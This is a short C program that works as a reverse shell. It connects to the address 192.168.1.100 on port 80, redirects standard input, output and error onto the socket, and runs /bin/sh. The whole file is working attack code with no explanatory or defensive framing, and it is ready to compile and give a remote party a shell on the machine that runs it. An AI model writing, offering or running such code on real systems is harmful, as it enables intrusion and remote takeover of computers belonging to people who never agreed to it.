#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *argv[] = {"/bin/sh", NULL};

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(80);  
    server.sin_addr.s_addr = inet_addr("192.168.1.100");  

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execve(argv[0], argv, NULL);
    return 0;
}